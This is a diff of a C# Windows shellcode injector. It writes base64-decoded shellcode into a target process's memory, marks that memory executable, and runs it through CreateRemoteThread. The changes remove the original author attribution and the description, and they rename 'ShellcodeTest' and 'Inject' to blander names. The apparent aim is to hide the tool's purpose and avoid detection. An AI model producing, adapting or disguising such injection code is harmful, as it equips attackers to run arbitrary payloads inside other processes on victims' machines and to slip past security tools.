@@ -1,12 +1,8 @@
-﻿/*  Author: TheWover
-    Description: Injects embedded base64-encoded shellcode into an arbitrary hardcoded process using native Windows 32 API calls.
-    Last Modified: 11/1/2018
- */
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace ShellcodeTest
+namespace UsualNameSpace
 {
     public class Program
     {
@@ -20,7 +16,7 @@ namespace ShellcodeTest
             if (args.Length >= 1)
                 pid = Convert.ToInt32(args[0]);
         
-            Inject(x86, x64, pid);
+            Infiltrate(x86, x64, pid);
         }
 
         [DllImport("kernel32.dll")]
@@ -62,7 +58,7 @@ namespace ShellcodeTest
         /// <param name="x64">Base64-encoded x64 shellcode</param>
         /// <param name="procPID">The PID of the target process.</param>
         /// <returns></returns>
-        public static int Inject(string x86, string x64, int procPID)
+        public static int Infiltrate(string x86, string x64, int procPID)
         {
             Console.WriteLine(procPID);
             Process targetProcess = Process.GetProcessById(procPID);
@@ -82,13 +78,14 @@ namespace ShellcodeTest
             IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
             UIntPtr bytesWritten;
+            
             WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
 
             CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
 
             return 0;
         }
-
+        
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
         public static extern bool IsWow64Process(System.IntPtr hProcess, out bool lpSystemInfo);
 
